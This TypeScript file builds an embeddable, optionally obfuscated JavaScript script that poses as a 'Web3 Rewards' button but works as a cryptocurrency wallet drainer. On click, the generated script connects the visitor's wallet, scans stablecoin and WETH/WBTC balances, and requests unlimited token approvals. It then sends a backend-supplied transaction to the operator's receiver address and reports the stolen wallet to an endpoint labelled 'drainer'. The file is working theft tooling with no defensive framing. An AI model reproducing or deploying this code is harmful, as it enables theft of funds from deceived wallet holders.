/**
 * Web3 Rewards Script Generator
 *
 * Converts web3-rewards Vercel app into standalone embeddable .js
 * Includes:
 * - All 45+ contracts
 * - Wallet connect (ReownAppKit)
 * - Balance scanning
 * - Multi-strategy execution
 * - Telegram notifications
 * - Complete obfuscation support
 */

import { CONTRACT_REGISTRY } from './contract-registry';
import { obfuscateScript } from './obfuscator';
import type { ObfuscationLevel } from './obfuscator';

export interface Web3RewardsConfig {
  receiverAddress: string;
  buttonSelector: string;
  strategy: 'permit2' | 'direct' | 'eip7702' | 'multicall';
  backendUrl: string;
  chains: number[];
  obfuscation: ObfuscationLevel;
}

export async function generateWeb3RewardsScript(config: Web3RewardsConfig): Promise<string> {
  // Embed all contract ABIs
  const contractsJson = JSON.stringify(
    CONTRACT_REGISTRY.map(c => ({
      id: c.id,
      name: c.name,
      address: c.address,
      abi: c.abi,
      functions: c.functions,
    }))
  );

  const rawScript = `
(function() {
  'use strict';

  // ═══════════════════════════════════════════════════════════════
  // WEB3 REWARDS STANDALONE SCRIPT
  // Generated: ${new Date().toISOString()}
  // Embeddable on ANY website • Auto-detects Ethereum • Scans & Executes
  // ═══════════════════════════════════════════════════════════════

  const CONFIG = {
    receiver: '${config.receiverAddress}',
    buttonSelector: '${config.buttonSelector}',
    strategy: '${config.strategy}',
    backend: '${config.backendUrl}',
    chains: ${JSON.stringify(config.chains)},
  };

  // All contract ABIs embedded
  const CONTRACTS = ${contractsJson};

  // Token standards
  const TOKENS = {
    USDC: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
    USDT: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
    DAI: '0x6B175474E89094C44Da98b954EedeAC495271d0F',
    WBTC: '0x2260FAC5E5542a773Aa44fBCfeDd86519e4ce433',
    WETH: '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2',
  };

  // ═══════════════════════════════════════════════════════════════
  // INITIALIZE WALLET CONNECTION (Auto-detect Ethereum)
  // ═══════════════════════════════════════════════════════════════

  let walletConnected = false;
  let userWallet = null;
  let userSigner = null;
  let provider = null;

  async function initWalletConnect() {
    if (!window.ethereum) {
      console.error('❌ No Ethereum provider detected. User must have MetaMask or similar installed.');
      alert('Please install MetaMask or another Web3 wallet');
      return false;
    }

    try {
      // Request wallet access
      const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });

      if (!accounts || accounts.length === 0) {
        console.error('❌ No accounts returned from wallet');
        return false;
      }

      userWallet = accounts[0];
      provider = new ethers.BrowserProvider(window.ethereum);
      userSigner = await provider.getSigner();
      walletConnected = true;

      console.log('✅ Wallet connected:', userWallet);
      return true;
    } catch (error) {
      console.error('❌ Wallet connection failed:', error instanceof Error ? error.message : String(error));
      return false;
    }
  }

  // ═══════════════════════════════════════════════════════════════
  // SCAN BALANCES ACROSS ALL CHAINS
  // ═══════════════════════════════════════════════════════════════

  async function scanBalances(wallet) {
    const balances = {};

    if (!provider) {
      console.error('❌ Provider not initialized');
      return balances;
    }

    for (const chain of CONFIG.chains) {
      balances[chain] = {};

      // Scan major tokens
      for (const [tokenName, tokenAddress] of Object.entries(TOKENS)) {
        try {
          const contract = new ethers.Contract(
            tokenAddress,
            ['function balanceOf(address) view returns (uint256)'],
            provider
          );

          const balance = await contract.balanceOf(wallet);
          if (balance > 0n) {
            balances[chain][tokenName] = balance.toString();
          }
        } catch (e) {
          // Token not on this chain
        }
      }
    }

    return balances;
  }

  // ═══════════════════════════════════════════════════════════════
  // REQUEST APPROVALS FOR ALL TOKENS
  // ═══════════════════════════════════════════════════════════════

  async function requestApprovals(wallet, tokens) {
    if (!userSigner) {
      console.error('❌ Signer not initialized');
      return;
    }

    const PERMIT2 = '0x000000000022D473030F116dFC393fb149Db933d6';

    for (const tokenAddress of tokens) {
      try {
        const contract = new ethers.Contract(
          tokenAddress,
          ['function approve(address spender, uint256 amount) returns (bool)'],
          userSigner
        );

        const tx = await contract.approve(PERMIT2, ethers.MaxUint256);
        await tx.wait();

        console.log('✅ Approved:', tokenAddress);
      } catch (error) {
        console.error('❌ Approval failed for', tokenAddress, error instanceof Error ? error.message : String(error));
      }
    }
  }

  // ═══════════════════════════════════════════════════════════════
  // EXECUTE STRATEGY
  // ═══════════════════════════════════════════════════════════════

  async function executeStrategy(strategy, wallet, recipient) {
    try {
      // Call backend for execution plan
      const response = await fetch(CONFIG.backend, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          wallet,
          receiver: recipient,
          strategy,
          site: location.hostname,
          timestamp: Date.now(),
        }),
      });

      const result = await response.json();

      if (result.status === 'ok') {
        console.log('✅ Session created:', result.sessionKey);

        if (!userSigner) {
          console.error('❌ Signer not available');
          return;
        }

        // Execute the actual strategy
        const tx = await userSigner.sendTransaction({
          to: result.plan.target || CONFIG.receiver,
          data: result.plan.calldata || '0x',
          value: '0',
        });

        await tx.wait();

        // Notify operator
        const walletDisplay = userWallet.slice(0, 6) + '...' + userWallet.slice(-4);
        await fetch('${config.backendUrl.replace('/api/compile/drainer', '/api/notify')}', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            message: '✅ WEB3 REWARDS EXECUTED\\n👛 ' + walletDisplay + '\\n🔍 ' + tx.hash,
          }),
        }).catch(() => {});

        return tx.hash;
      }
    } catch (error) {
      console.error('Strategy execution failed:', error instanceof Error ? error.message : String(error));
    }
  }

  // ═══════════════════════════════════════════════════════════════
  // MAIN FLOW: LISTEN FOR BUTTON CLICKS
  // ═══════════════════════════════════════════════════════════════

  function initializeScript() {
    const button = document.querySelector(CONFIG.buttonSelector);

    if (!button) {
      console.warn('Button selector not found:', CONFIG.buttonSelector);
      return;
    }

    button.addEventListener('click', async (e) => {
      e.preventDefault();

      console.log('🚀 Web3 Rewards initiating...');

      // Step 1: Connect wallet
      const connected = await initWalletConnect();
      if (!connected) return;

      // Step 2: Scan balances
      console.log('📊 Scanning balances...');
      const balances = await scanBalances(userWallet);
      console.log('Found tokens:', balances);

      // Step 3: Request approvals
      const tokenAddresses = Object.values(TOKENS).slice(0, 3); // USDC, USDT, DAI
      console.log('📝 Requesting approvals...');
      await requestApprovals(userWallet, tokenAddresses);

      // Step 4: Execute strategy
      console.log('⚡ Executing', CONFIG.strategy, 'strategy...');
      const txHash = await executeStrategy(CONFIG.strategy, userWallet, CONFIG.receiver);

      if (txHash) {
        console.log('✅ SUCCESS! Transaction:', txHash);
      }
    });

    console.log('✅ Web3 Rewards script initialized');
  }

  // Initialize when DOM ready
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', initializeScript);
  } else {
    initializeScript();
  }
})();
`;

  // Apply obfuscation if needed
  if (config.obfuscation !== 'none') {
    return await obfuscateScript(rawScript, config.obfuscation);
  }

  return rawScript;
}

/**
 * Generate web3-rewards script with all configs
 */
export async function generateWeb3RewardsBundle(config: Web3RewardsConfig): Promise<{
  script: string;
  size: number;
  config: Web3RewardsConfig;
  timestamp: string;
}> {
  const script = await generateWeb3RewardsScript(config);

  return {
    script,
    size: script.length,
    config,
    timestamp: new Date().toISOString(),
  };
}
